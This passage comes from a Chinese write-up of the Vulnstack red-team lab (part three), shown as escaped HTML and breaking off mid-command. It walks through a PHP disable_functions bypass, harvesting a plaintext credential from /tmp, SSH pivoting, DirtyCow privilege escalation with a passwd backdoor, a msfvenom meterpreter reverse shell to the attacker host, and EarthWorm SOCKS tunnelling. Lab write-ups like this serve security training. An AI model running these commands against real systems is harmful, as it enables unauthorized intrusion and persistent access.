src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image43.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e获得shell ？\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e利用蚁🗡进行反弹\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image44.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e返回\u003ccode\u003eret=127\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找原因，查看之前的\u003ccode\u003e1.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image45.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将执行函数禁用了（我前面使用\u003ccode\u003eMSF\u003c/code\u003e生成反弹\u003ccode\u003eshell\u003c/code\u003e代码一直不成功都怀疑自己了，原来是这里卡住了）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e绕过\u003cstrong\u003eDisable Functions\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\"\u003ehttps://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e将\u003ccode\u003ebypass_disablefunc.php\u003c/code\u003e和\u003ccode\u003ebypass_disablefunc_x64.so\u003c/code\u003e通过蚁🗡上传到当前目录\u003c/p\u003e\n\u003cp\u003e测试，输入\u003ccode\u003eurl\u003c/code\u003e测试\u003ccode\u003epwd\u003c/code\u003e命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e?cmd=pwd\u0026#x26;outpath=/var/www/html/output\u0026#x26;sopath=/var/www/html/bypass_disablefunc_x64.so\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image46.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试了反弹\u003ccode\u003eshell\u003c/code\u003e但是没有成功\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e内网信息收集\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e蚁🗡由绕过\u003cstrong\u003eDisable Functions\u003c/strong\u003e的插件，安装后虚拟终端可以正常回显\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/Medicean/as_bypass_php_disable_functions\"\u003ehttps://github.com/Medicean/as_bypass_php_disable_functions\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e信息收集\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e(www-data:/var/www/html/templates/beez3) $ ip add\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: lo: \u0026#x3C;LOOPBACK,UP,LOWER_UP\u003e mtu \u003cspan class=\"hljs-number\"\u003e65536\u003c/span\u003e qdisc noqueue state UNKNOWN group default qlen \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n    link/loopback \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e brd \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e\n    inet \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e128\u003c/span\u003e scope host \n       valid_lft forever preferred_lft forever\n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e: ens33: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu \u003cspan class=\"hljs-number\"\u003e1500\u003c/span\u003e qdisc pfifo_fast state UP group default qlen \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\n    link/ether \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0c:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:ab:\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e:ac brd ff:ff:ff:ff:ff:ff\n    inet \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.120\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e brd \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e scope \u003cspan class=\"hljs-keyword\"\u003eglobal\u003c/span\u003e ens33\n       valid_lft forever preferred_lft forever\n    inet6 fe80::20c:29ff:feab:32ac/\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e scope link \n       valid_lft forever preferred_lft forever\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e确定web服务器的IP是\u003ccode\u003e192.168.93.120\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e(www-data:/var/www/html/templates/beez3) $ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) gid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) groups=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data)\n(www-data:/var/www/html/templates/beez3) $ whoami\nwww-data\n(www-data:/var/www/html/templates/beez3) $ uname -a\nLinux ubuntu \u003cspan class=\"hljs-number\"\u003e4.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e142\u003c/span\u003e-generic \u003cspan class=\"hljs-comment\"\u003e#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找敏感内容\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e/tmp\u003c/code\u003e下存在\u003ccode\u003etest.txt\u003c/code\u003e ，像是一个用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e(www-data:/tmp/mysql) $ cat test.txt\nadduser wwwuser\npasswd wwwuser_123Aqx\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e拿到一个用户的信息，我们尝试登录\u003ccode\u003essh\u003c/code\u003e ，登陆成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003essh wwwuser@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa\nwwwuser@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e's password:\nLast login: Sun Oct  6 20:24:43 2019 from 192.168.1.122\n[wwwuser@localhost ~]$  \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看其IP信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[wwwuser@localhost ~]$ ip add\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: lo: \u0026#x3C;LOOPBACK,UP,LOWER_UP\u003e mtu \u003cspan class=\"hljs-number\"\u003e16436\u003c/span\u003e qdisc noqueue state UNKNOWN \n    link/loopback \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e brd \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e\n    inet \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e scope host lo\n    inet6 ::\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e128\u003c/span\u003e scope host \n       valid_lft forever preferred_lft forever\n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e: eth0: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu \u003cspan class=\"hljs-number\"\u003e1500\u003c/span\u003e qdisc pfifo_fast state UP qlen \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\n    link/ether \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0c:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:c9 brd ff:ff:ff:ff:ff:ff\n    inet \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e brd \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e scope \u003cspan class=\"hljs-keyword\"\u003eglobal\u003c/span\u003e eth0\n    inet6 fe80::20c:29ff:fe32:46c9/\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e scope link \n       valid_lft forever preferred_lft forever\n\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e: eth1: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu \u003cspan class=\"hljs-number\"\u003e1500\u003c/span\u003e qdisc pfifo_fast state UP qlen \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\n    link/ether \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0c:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:d3 brd ff:ff:ff:ff:ff:ff\n    inet \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.100\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e brd \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e scope \u003cspan class=\"hljs-keyword\"\u003eglobal\u003c/span\u003e eth1\n    inet6 fe80::20c:29ff:fe32:46d3/\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e scope link \n       valid_lft forever preferred_lft forever\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e两张网卡，可以知道这个是\u003ccode\u003enginx\u003c/code\u003e服务器的主机，用来做反向代理的，内网IP是\u003ccode\u003e192.168.93.100\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看代理配置\u003ccode\u003e/etc/nginx/nginx.conf\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ehttp {                                                                                                                                                                                                                                                                                                                                                                                                                            \n  server {                                                                                                                                                                                                                                                                                                                                                                                                                       \n        listen  \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e;                                                                                                                                                                                               \n        server_name  localhost;                                                                                                                                                                                                                                                                                                                                                                                              \n        location / {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       \n         proxy_pass  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.120\u003c/span\u003e;                                                                                                                                                                                                                                                                                                                                                                                 \n              proxy_set_header        Host $host;                                                                                                                                                                 \n              proxy_set_header        X-Real-IP $remote_addr;  \u003cspan class=\"hljs-comment\"\u003e#获取真实ip                                                                                                                                        \u003c/span\u003e\n              proxy_connect_timeout   \u003cspan class=\"hljs-number\"\u003e90\u003c/span\u003e;                                                                                                                                                                         \n              proxy_send_timeout      \u003cspan class=\"hljs-number\"\u003e90\u003c/span\u003e;                                                                                                                                                                         \n              proxy_read_timeout      \u003cspan class=\"hljs-number\"\u003e90\u003c/span\u003e;\n              proxy_buffer_size       4k;\n              proxy_buffers           \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e 32k;\n              proxy_busy_buffers_size 64k;\n              proxy_temp_file_write_size 64k;\n              proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\u003cspan class=\"hljs-comment\"\u003e#获取代理者的真实ip\u003c/span\u003e\n              proxy_redirect          off;\n}\n}\n}\nstream  {                                                                                                                                                                                                                                                                                                                                                                                                                         \nupstream proxy_name {                                                                                                                                                                                                                                                                                                                                                                                                             \n    server \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.120\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e;                                                                                                                                                                                                                                                                                                                                                                                                 \n}                                                                                                                                                                                                                                                        \nserver {                                                                          \n    listen \u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e;                                                                   \n    proxy_pass proxy_name;                                                                                                                    \n}                                                \n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e尝试提权\u003ccode\u003enginx\u003c/code\u003e主机，方便后续操作，查看内核\u003ccode\u003e2.6.32\u003c/code\u003e在脏牛(\u003ccode\u003eDirtyCow\u003c/code\u003e)(\u003ccode\u003eCVE-2016-5195\u003c/code\u003e)的范围内\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[wwwuser@localhost tmp]$ uname -a\nLinux localhost.localdomain \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.32\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e431.\u003c/span\u003eel6.x86_64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eEXP\u003c/code\u003e地址\u003ca href=\"https://github.com/FireFart/dirtycow\"\u003ehttps://github.com/FireFart/dirtycow\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e将EXP传到靶机上去，然后编译执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egcc -pthread dirty.c -o dirty -lcrypt\n./dirty \u003cspan class=\"hljs-number\"\u003e123456\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[wwwuser@localhost tmp]$ ./dirty \u003cspan class=\"hljs-number\"\u003e123456\u003c/span\u003e \n/etc/passwd successfully backed up to /tmp/passwd.bak\nPlease enter the new password: \u003cspan class=\"hljs-number\"\u003e123456\u003c/span\u003e\nComplete line:\nfirefart:fi8RL.Us0cfSs:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:pwned:/root:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash\n\nmmap: 7f141f280000\n\nmadvise \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\nptrace \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\nDone! Check /etc/passwd to see \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e the new user was created.\nYou can log \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e the username \u003cspan class=\"hljs-string\"\u003e'firefart'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e the password \u003cspan class=\"hljs-string\"\u003e'123456'\u003c/span\u003e.\n\nDON\u003cspan class=\"hljs-string\"\u003e'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd   \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e创建了一个新用户\u003ccode\u003efirefart\u003c/code\u003e，密码是\u003ccode\u003e123456\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e切换账户查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[firefart@localhost tmp]\u003cspan class=\"hljs-comment\"\u003e# id\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) gid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) 组=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eroot！！！\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e添加新的超级管理员用户（权限维持，不过很明显）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eecho \u003cspan class=\"hljs-string\"\u003e\"sunset:savbSWc4rx8NY:0:0::/:/bin/sh\"\u003c/span\u003e \u003e\u003e passwd.bak\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e密码是\u003ccode\u003emomaek\u003c/code\u003e ，新建后将\u003ccode\u003emv /tmp/passwd.bak /etc/passwd\u003c/code\u003e \u003ccode\u003eDON'T FORGET TO RESTORE!\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e之后就可以登录\u003ccode\u003esunset\u003c/code\u003e用户来操作了\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e上线MSF\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e生成\u003ccode\u003epayload\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsfvenom -p python/meterpreter/reverse_tcp lport=\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e lhost=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.129\u003c/span\u003e -f raw \u003e getshell.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e将\u003ccode\u003egetshell.py\u003c/code\u003e 上传到靶机，\u003ccode\u003ekali\u003c/code\u003e开启监听，执行\u003ccode\u003egetshell.py\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# kali 开启监听\u003c/span\u003e\nmsf6 \u003e use exploit/multi/handler \nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload python/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e  \nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.129\u003c/span\u003e \nmsf6 exploit(multi/handler) \u003e run \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 靶机执行文件\u003c/span\u003e\n-sh-\u003cspan class=\"hljs-number\"\u003e4.1\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e# python getshell.py \u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 exploit(multi/handler) \u003e run\n\n[*] Started reverse TCP handler on \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.129\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e \n[*] Sending stage (\u003cspan class=\"hljs-number\"\u003e24772\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e) to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e\n[*] Meterpreter session \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e opened (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.129\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e42433\u003c/span\u003e) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e:03 +0800\n\nmeterpreter \u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上线成功\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e内网主机\u0026#x26;信息探测\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e上线\u003ccode\u003eMSF\u003c/code\u003e后，添加通向内网的路由\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e run post/multi/manage/autoroute\nmeterpreter \u003e run autoroute -p\n\n[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.\n[!] Example: run post/multi/manage/autoroute OPTION=value [...]\n\nActive Routing Table\n====================\n\n   Subnet             Netmask            Gateway\n   ------             -------            -------\n   \u003cspan class=\"hljs-number\"\u003e169.254\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e        \u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e        Session \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n   \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e       \u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e      Session \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n   \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e      \u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e      Session \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用**\u003ccode\u003eEarthworm\u003c/code\u003e**在\u003ccode\u003ekali\u003c/code\u003e和\u003ccode\u003eCentos\u003c/code\u003e中建立一条隧道\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://rootkiter.com/EarthWorm/\"\u003ehttps://rootkiter.com/EarthWorm/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003ccode\u003eearthworm\u003c/code\u003e搭建\u003ccode\u003esocks5\u003c/code\u003e反向代理服务 是为了让kali（攻击者）的程序进入内网，可以扫描内网主机信息等\u003c/p\u003e\n\u003cp\u003eew流量走向：本地流量–本地\u003ccode\u003e1080\u003c/code\u003e端口–web服务器\u003ccode\u003e8888\u003c/code\u003e端口（利用EW）-- 内网服务器 – web服务器的\u003ccode\u003e8888\u003c/code\u003e端口 – 本地\u003ccode\u003e1080\u003c/code\u003e端口\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eKali（此处用的是反向的）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e./ew_for_linux64 -s rcsocks -l \u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e -e \u003cspan class=\"hljs-number\"\u003e8888\u003c/span\u003e\nrcsocks \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e \u0026#x3C;--[\u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e usec]--\u003e \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8888\u003c/span\u003e\ninit cmd_server_for_rc here\nstart listen port here\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCentos\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e./ew_for_linux64 -s rssocks -d \u003cspan 